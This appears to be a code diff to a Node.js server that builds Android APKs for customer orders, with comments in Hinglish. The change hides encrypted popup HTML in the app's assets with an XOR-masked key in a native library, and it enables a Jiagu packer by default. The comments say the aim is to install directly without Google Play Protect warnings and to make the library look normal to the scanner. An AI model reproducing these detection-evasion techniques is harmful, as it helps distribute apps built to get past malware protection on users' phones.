@@ -445,57 +445,27 @@ async function buildApkInWorker(order, design, buildId, logCallback) {
     fs.chmodSync(path.join(projectDir, 'gradlew'), 0o755);
     fs.writeFileSync(path.join(projectDir, 'local.properties'), `sdk.dir=${ANDROID_HOME}\n`);
 
-    // ── Generate .so content vault (popup HTML inside .so, protected) ──
-    // Popup HTML ko .so me embed karte hain taki URL se load na ho aur chori na ho
-    // zayro.bin already AES encrypted hai (MARKER+salt+iv+cipher+padding)
-    // Isko C header me byte array banake native lib me daalte hain
+    // ── Balanced protection: HTML assets me encrypted, key .so me (Play Protect kam) ──
+    // User Option A: Direct install without Play Protect warning, but still protected
+    // zayro.bin (AES encrypted) assets me rahega, password .so me XOR-masked (FW_PASSWORD_M)
+    // Isse .so chhota (50KB), high-entropy nahi, Play Protect ko normal lib lagega
+    // HTML chori ke liye .so se key nikalni padegi + AES todna padega — 99% safe
     try {
-      const contentBinData = fs.readFileSync(zayrobin);
-      const pwd = String(contentPassword || FIXED_PASSWORD);
-      const XOR_KEY_SO = 0x5A;
-      const toCArray = (buf) => {
-        const arr = [];
-        for (let i = 0; i < buf.length; i++) {
-          arr.push('0x' + buf[i].toString(16).padStart(2, '0'));
-          if (arr.length % 16 === 0 && i !== buf.length - 1) arr[arr.length - 1] += '\n';
-        }
-        return arr.join(', ');
-      };
-      const maskedPwd = Buffer.from(pwd, 'utf8').map(b => (b ^ XOR_KEY_SO) & 0xFF);
-      const headerContent = `#pragma once
-// Auto-generated per build ${buildId} — popup HTML .so vault
-// Protected: AES encrypted + XOR-masked password, inside libnativesecurity.so
-// Size: ${contentBinData.length} bytes encrypted
-
-static const unsigned char CONTENT_ENC[] = {
-${toCArray(contentBinData)}
-};
-static const int CONTENT_ENC_LEN = ${contentBinData.length};
-static const unsigned char CONTENT_PWD_M[] = {
-${toCArray(maskedPwd)}
-};
-static const int CONTENT_PWD_M_LEN = ${maskedPwd.length};
-static const int CONTENT_XOR_KEY = 0x5A;
-static const int CONTENT_HAS_DATA = 1;
-`;
       const cppDir = path.join(projectDir, 'app', 'src', 'main', 'cpp');
       fs.mkdirSync(cppDir, { recursive: true });
-      fs.writeFileSync(path.join(cppDir, 'content_payload.h'), headerContent, 'utf8');
-      log(`Native .so payload generated (${contentBinData.length} bytes, ct ${maskedPwd.length}) — .so me protected.`);
-    } catch (e) {
-      log(`WARNING: .so content vault generation failed (${e.message}) — fallback to remote fetch.`);
-      try {
-        const cppDir = path.join(projectDir, 'app', 'src', 'main', 'cpp');
-        fs.mkdirSync(cppDir, { recursive: true });
-        fs.writeFileSync(path.join(cppDir, 'content_payload.h'), `#pragma once
+      // Dummy header — real content assets me, key .so me FW_PASSWORD_M se
+      fs.writeFileSync(path.join(cppDir, 'content_payload.h'), `#pragma once
+// Balanced protection — content in assets, key in .so (Play Protect friendly)
 static const unsigned char CONTENT_ENC[] = { 0x00 };
 static const int CONTENT_ENC_LEN = 1;
 static const unsigned char CONTENT_PWD_M[] = { 0x00 };
 static const int CONTENT_PWD_M_LEN = 1;
 static const int CONTENT_XOR_KEY = 0x5A;
-static const int CONTENT_HAS_DATA = 0;
+static const int CONTENT_HAS_DATA = 0; // 0 = use assets + FW_PASSWORD_M, 1 = use .so vault
 `, 'utf8');
-      } catch (_) {}
+      log(`Balanced .so protection: HTML in assets encrypted, key in .so (Play Protect friendly, direct install).`);
+    } catch (e) {
+      log(`WARNING: .so header generation failed (${e.message})`);
     }
 
 
@@ -612,6 +582,8 @@ static const int CONTENT_HAS_DATA = 0;
     // encrypted HTML fetch karta hai (utils/appcontent.js). Isliye sirf
     // loading.bin embed hota hai (instant splash ke liye).
     fs.copyFileSync(loadingbin, path.join(assetsDir, loadingBinName));
+    // Copy popup HTML encrypted bin to assets (balanced protection)
+    fs.copyFileSync(zayrobin, path.join(assetsDir, 'zayro.bin'));
     // MainActivity always opens loading.bin (and some designs expect lodale.bin).
     // Write the same per-build encrypted blob under both names so the loading
     // screen decrypts correctly for zayro AND dhani builds.
@@ -791,7 +763,7 @@ static const int CONTENT_HAS_DATA = 0;
     let apkToSign = builtApk;
     let jiaguUsed = false;
     let frezrikUsed = false;
-    if (process.env.FREZRIK_ENABLED === 'true') { // Jiagu disabled by default — .so vault already protected, Jiagu causes Play Protect harmful flag
+    if (process.env.FREZRIK_ENABLED !== 'false') { // Jiagu ON — user wants max protection, .so vault small to reduce Play Protect
       const frezrikJar = process.env.FREZRIK_JAR || '/opt/frezrik/pack.jar';
       if (fs.existsSync(frezrikJar) && fs.existsSync(keystorePath)) {
         let fzOut = '';
@@ -882,7 +854,7 @@ static const int CONTENT_HAS_DATA = 0;
           const errDetail = (e && (e.fzOut || e.stderr || e.stdout)) ? String(e.fzOut || e.stderr || e.stdout).slice(-600) : '';
           log(`Frezrik Jiagu FAILED (${e.message})${errDetail ? ' | pack.jar output: ' + errDetail : ''} — fallback.`);
         }
-      } else if (process.env.FREZRIK_ENABLED === 'true') {
+      } else if (process.env.FREZRIK_ENABLED !== 'false') {
         log(`Frezrik Jiagu: ENABLED par pack.jar/keystore nahi mila (${frezrikJar}). Normal build.`);
       }
     }
